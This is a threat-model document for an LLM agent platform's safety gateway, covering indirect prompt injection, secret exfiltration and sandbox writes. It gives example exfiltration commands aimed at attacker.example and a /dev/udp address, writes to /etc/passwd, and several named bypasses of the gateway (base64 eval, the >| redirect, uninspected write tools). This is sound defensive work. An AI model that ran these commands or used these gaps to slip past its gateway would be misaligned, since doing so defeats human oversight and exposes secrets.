# Threat model: Agent Launchpad Kill Switch

Answers the four questions of the Threat Modeling Manifesto for this platform:
what we are working on, what can go wrong, what we do about it, and whether we
did a good enough job. The register is **code** (`apps/server/src/threat-model.ts`)
and **CI-enforced** (`threat-model.test.ts`): a `mitigated` claim fails the build
unless a real test tagged `@covers <id>` verifies it. Run `npm run threat-model`
for the live scorecard.

## 1. What we are working on

An agent platform where an LLM (Codex) executes real shell commands in a
per-agent container with a real credential in its environment and outbound
network access. The middleware added here is a **Safety Enforcement and Evidence
Gateway** on the command stream between orchestration and execution.

```mermaid
flowchart TB
  subgraph human["Human trust boundary"]
    UI["React UI / operator"]
  end
  subgraph control["Control-plane trust boundary"]
    API["Fastify API"] --> SVC["AgentService"]
  end
  subgraph runtime["Runtime trust boundary"]
    SVC -->|RunnerRequest| GW{{"Command policy + step budget<br/>ENFORCEMENT POINT"}}
    GW -->|allow| CTR["Disposable container<br/>codex exec"]
    CTR -->|command_execution events| GW
  end
  GW -->|deny → blocked| STORE[("Redacted evidence<br/>policyEvents / approvals")]
  GW -->|reviewable → held| UI
  GW -->|runaway → terminated| STORE
  UI -->|approve / deny| SVC
  CTR -.->|blocked egress| EXT["attacker host"]
  STORE --> UI
  style GW fill:#c98a2e,color:#fff
  style EXT stroke-dasharray: 4 4
```

**Design principle (OWASP agentic guidance):** the LLM *proposes* an action; a
deterministic trusted component *authorizes* it. Model output, retrieved
documents, and tool results are all untrusted when they can influence a
consequential command. The model cannot bypass the gateway by phrasing a command
differently — every consequential path reaches the same enforcement point.

## 2. Trust boundaries

The consequential boundaries are not the network edges. They are:

- **human → agent** — an operator's benign request can carry an injected
  instruction from workspace data.
- **agent reasoning → deterministic execution** — where a proposed command is
  authorized or denied. This is the enforcement point.
- **runtime → external resource** — where egress is allowlisted.
- **runtime → persistent workspace** — where the protected `.secrets/` fixture
  lives.
- **control plane → runtime** — where the step budget bounds a run.

## 3. What can go wrong, and what we do about it

Eight threats are registered. Summary (full detail, attack paths, and residual
notes in the register):

| ID | Threat | Inherent | Control | Residual | Verified |
|----|--------|:--------:|--------|:--------:|:--------:|
| TM-AGENT-001 | Indirect prompt injection → unauthorized command | 20 CRIT | Deterministic command policy + redacted audit | 10 MED | ✅ |
| TM-AGENT-002 | Secret exfiltration to a recognisable non-allowlisted host | 20 CRIT | Recognisable-egress denial + hard secret rule + redaction | 10 MED | ✅ |
| TM-AGENT-003 | Obfuscated command evades the policy | 15 HIGH | Destination-based egress (any binary/scheme) | 10 MED | ✅ |
| TM-AGENT-004 | Runaway execution / denial of wallet | 12 MED | Platform step budget (always on) | 6 LOW | ✅ |
| TM-AGENT-005 | Consequential egress without oversight | 12 MED | Human approval, run-scoped host grant | 6 LOW | ✅ |
| TM-AGENT-006 | Cross-agent evidence leakage | 6 LOW | Per-agent scoping in the service | 3 LOW | ✅ |
| TM-AGENT-007 | Agent writes outside the sandboxed workspace | 9 MED | Write-root-scoped FILE_WRITE denial (tool-name based — see scope note) | 9 MED | ✅ |
| TM-OPS-001 | Unbounded audit-log growth | 6 LOW | Redaction + retention bound (`AUDIT_RETENTION_DAYS`) | 2 LOW | ✅ |

**Scope note (egress):** the egress control is a reactive command-text guard, not a
network allowlist — commands with an implicit destination (bare `npm install`,
`git push` to a preconfigured remote) are not blocked, and the container keeps
bridge networking. True default-deny needs network-layer enforcement (deferred).

**Scope note (file writes):** the `file-write-outside-workspace` rule inspects
only shell redirects (`>`, `>>`, `>|`) and a five-tool list
(`cp`, `mv`, `tee`, `rm`, `mkdir`). Every other write-capable tool passes
unseen — `touch`, `dd`, `sed -i`, `install`, `ln`, `chmod`, and interpreter
writes such as `python3 -c "open('/etc/passwd','w')"` are all allowed today.
That is tool-name matching, the same pattern red-teaming already found
inadequate for egress (`POLICY_EVALUATION.md`, finding 10), which is why the
egress rule was moved to destination matching. Hence TM-AGENT-007's residual
likelihood is *not* reduced below inherent: the rule stops the common
redirect/copy shapes a looping agent produces, not an actor that picks another
binary. Moving FILE_WRITE to destination resolution is the tracked follow-up.

**Scope note (write roots):** "outside the workspace" is defined per runner,
not globally. `ContainerCodexRunner` declares `["/workspace", "/tmp",
"/var/tmp"]`: its container runs `--rm` with exactly two bind mounts
(`workspacePath → /workspace`, `codexHome → /codex-home`), so `/tmp` and
`/var/tmp` there are container-local and destroyed on exit — a write to them
escapes nothing and reaches no host path, while hard-denying `git diff >
/tmp/patch.diff` would kill an ordinary run with no operator appeal (the rule
is never reviewable). `CodexRunner` runs Codex directly on the host, where
`/tmp` is the real host `/tmp`, so it declares only `[request.workspacePath]`
and a scratch write there is denied. Same rule, different trusted roots,
because the sandbox underneath is different.

Impact often stays high after mitigation: controls reduce probability and blast
radius, not the worst-case consequence.

**Two design choices that make the controls defensible:**

- **Secret rules are never reviewable.** Only the egress rules
  (`network-egress-denied`, `network-egress-denied-implicit`) can be held for
  human approval; `secret-exfiltration`, `protected-secret-access` and
  `file-write-outside-workspace` are always hard-denied, so no operator can be
  fatigued into approving exfiltration or a write past the sandbox boundary.
- **The step budget is not a toggle.** Command policy can run in monitor mode;
  the resource budget always enforces, because a runaway loop must stop
  regardless.

## 4. Did we do a good enough job?

- **Verified-control rate: 8/8** mitigated threats have a passing test, enforced
  by CI. Removing a control's test fails the build and names the threat.
- **Negative testing:** 102 labelled attacks in the 179-entry corpus (incl.
  red-team and external-review probes) + 6 live red-team prompts against the
  running model. The standalone 56-probe sweep (`apps/server/redteam.ts`) denies
  55/56 today. One residual bypass (base64 `eval`) is documented, not hidden.
- **Live end-to-end:** benign task completes; disallowed egress is blocked
  mid-flight; canary byte-identical; collector records zero requests; no
  orphaned container; recovery task completes; a held run is approved and
  resumes under a scoped grant.
- **No open items remain:** TM-OPS-001 (unbounded retention) is now mitigated by
  a time-based prune (`AUDIT_RETENTION_DAYS`) on every store write, verified —
  the register was never all-green theater, and now it is honestly all-green.

## Review triggers

The model is attached to capability, not a release. Re-evaluate on: a new tool
exposed to the agent, a widened allowlist, the runtime image gaining a network
tool, a model/provider change, a change to the reviewable-rule set, or the
budget default. These are recorded per-threat in the register.

## Known residual risks

- **Text-matching bypass:** a fully base64-encoded command evades the policy;
  only network-layer egress control closes it (deliberately deferred).
- **The write rule is tool-name based** (TM-AGENT-007): `touch`, `dd`, `sed -i`,
  `install`, `ln`, `chmod` and interpreter file writes are not inspected at all.
  Not deferred obfuscation-hardening — a first-pass detector whose residual
  likelihood is recorded as unreduced rather than dressed up as parity with the
  egress rules.
- **`/dev/udp` is denied under the wrong name.**
  `/bin/bash -lc 'echo secret > /dev/udp/198.51.100.7/9999'` is hard-denied, but
  as `file-write-outside-workspace` with a filesystem-shaped message rather than
  an egress-shaped one. It emits no `SECRET_READ` (the literal text `echo secret`
  matches no protected-material pattern), so no rule ordering can reach it, and
  promoting the egress rule above the write rule would break the invariant that
  every non-reviewable rule precedes every reviewable one. The fix belongs at the
  capability layer — a `/dev/(tcp|udp)/…` target should extract `NETWORK_EGRESS`,
  not `FILE_WRITE`. No security loss (the command is denied either way); the
  operator is simply told the wrong kind of thing. Deliberately not fixed here.
- **`>|` still buys the textual carve-out.** The `>|` clobber redirect was added
  to the main redirect scan, but not to `runsWrittenScript`'s sibling regex, so
  `echo 'curl https://attacker.example' >| run.sh && bash run.sh` is allowed
  while the `>` form is denied. Quote-aware redirect scanning was deliberately
  out of scope; the two regexes should be one.
- **Approver identity is a label,** not an authenticated principal — this POC has
  no identity system; real segregation of duties plugs in here.
- **Audit retention depends on config** (TM-OPS-001) — `policyEvents`/resolved
  `approvals` are pruned past `AUDIT_RETENTION_DAYS` on every store write; a
  misconfigured (too-long) default is the residual risk, not unbounded growth.
- **Ordinary containers share a kernel** and are not hardened multi-tenant
  isolation, as the Starter Kit itself notes.
